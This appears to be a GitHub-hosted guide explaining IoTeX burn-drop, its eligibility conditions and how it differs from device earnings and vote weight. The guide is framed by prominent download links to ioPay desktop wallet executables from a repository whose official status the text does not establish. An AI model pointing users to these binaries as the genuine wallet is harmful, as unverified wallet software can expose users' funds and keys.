![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# IoTeX Burn-Drop: What It Is and Whether You Receive It

**Burn-drop is a chain mechanism: device activation burns IOTX and restakes it to qualified staking buckets** (F033). It is not a payout per device, not a claim you make on a website, and not the same thing as DePIN device earnings.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

The distinction explains almost every question about it, including the most common one - "why is my allocation zero?"

## The mechanism, in three parts

1. **Device activation.** A registered device (via `ioID`, the device identity layer) contributes an activation, and that activation burns IOTX (F033).
2. **Restaking to qualified buckets.** The burned-and-restaked value attaches to **staking buckets that qualify** - so the allocation lives against a staking position, not against a device (F025).
3. **Allocations shown per bucket.** The wallet displays them alongside your staking positions, which is the only place to check what you actually have.

Two consequences worth stating plainly:

- **Staking is a prerequisite** for the bucket side. No qualified bucket, no allocation to show.
- **The device is a prerequisite** for the activation side. No activation, nothing to restake.

## "Do I receive it?"

Q042, answered in parts:

- **Do you have registered devices?** Registration is what creates the device identity that activation uses ([registering an ioID device](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/registering-an-ioid-device-with-iopay.md)).
- **Do you have staking buckets that qualify?** Qualification depends on the staking position - amount, duration and stake-lock state are the parameters that matter (F043).
- **Does your build show per-bucket allocations?** The DePIN section lists them (F025); that is the check, not a website's calculator.

If any of the three is missing, the allocation is zero and nothing is broken.

## Burn-drop vs device earnings

These are two different numbers, and mixing them produces the "my rewards don't add up" thread:

| | Burn-drop | Device earnings |
|---|---|---|
| Source | chain mechanism from device activation (F033) | the project, for the resource your device contributes |
| Attaches to | a qualified staking bucket | a device |
| Shown in | the DePIN/staking views per bucket (F025) | the device list |

A wallet that blends them into one "rewards" figure cannot be reconciled with either source. Keep them apart.

## Burn-drop vs votes

Also keep these apart: **vote weight is governance weight, not tokens** (F044). A 70k stake can display ~92k votes, and withdrawal returns the staked amount plus rewards - not the vote number, and not the allocation figure. Three different numbers, three different meanings.

## What this page will not tell you

**A rate.** No per-device or per-bucket figure is published here, and any number would be stale or wrong.

**Which devices qualify.** Qualification is set by the project and by the staking side, and this page names no model as supported.

**That registering guarantees anything.** Registration makes a device visible; allocation depends on the mechanism and on qualifying buckets.

## How to check your own position

1. **Staking view** - are there buckets, and are they qualified?
2. **DePIN view** - is the device registered, and does an allocation appear against a bucket?
3. **Consistency** - does the number match the bucket it is attached to, rather than a device?

If the numbers do not appear where you expect, [the rewards troubleshooting page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-rewards-not-showing-up.md) covers the display side, and [the dashboard page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-depin-earnings-dashboard-explained.md) explains which panel is authoritative for which figure.

## FAQ

**What is IoTeX burn-drop and do I receive it?**
A chain mechanism where device activation burns IOTX and restakes it to qualified staking buckets. You receive an allocation only if both the device activation and a qualifying staking bucket exist.

**Why is my burn-drop allocation zero?**
No registered device, no qualified bucket, or a build/view that is not showing it.

**Is burn-drop the same as staking rewards?**
No. Staking rewards come from delegation; burn-drop allocations come from device activation and attach to buckets.

**Do I need to stake to get burn-drop?**
Yes for the bucket side - the allocation attaches to a qualified staking position.

**Can I claim burn-drop from a website?**
No. It is a chain mechanism displayed against your positions, not an off-chain claim.

## Where each number comes from, so you can check them

Three figures get confused on this topic, and each has a different origin. Knowing which is which is how you check a claim instead of trusting it.

**Your staked amount** is what you delegated, and it is the number your exit returns, plus accrued rewards.

**Your vote weight** is governance weight derived from the stake, and it is not a balance (F044). It can read higher than the staked amount, and withdrawing never returns the vote number.

**Your burn-drop allocation** is the restaked value attached to a qualified bucket (F033, F025). It is not a payout received into a spendable balance, and it is not a device's earnings.

If a screen shows a number you cannot assign to one of those three, resolve it before acting on it - the three move for different reasons and respond to different actions.

## Why your device list and your bucket list can disagree

The two lists answer different questions. The device list is about identity and registration: which devices are registered to you and contributing activations. The bucket list is about staking positions: which of them qualify for an allocation.

So a registered device with no qualified bucket shows activity on one screen and nothing on the other, and that is the mechanism working rather than a display fault. Conversely, a qualified bucket with no device behind it has no activation to attach - the bucket exists, the allocation does not.

When the two disagree, the question is not "which screen is wrong" but "which half of the mechanism is missing": the activation, the qualifying position, or both.

---

*Burn-drop and ioID follow IoTeX documentation (F033); per-bucket display from the v2.0.2 feature set (F025); parameters from F043.*
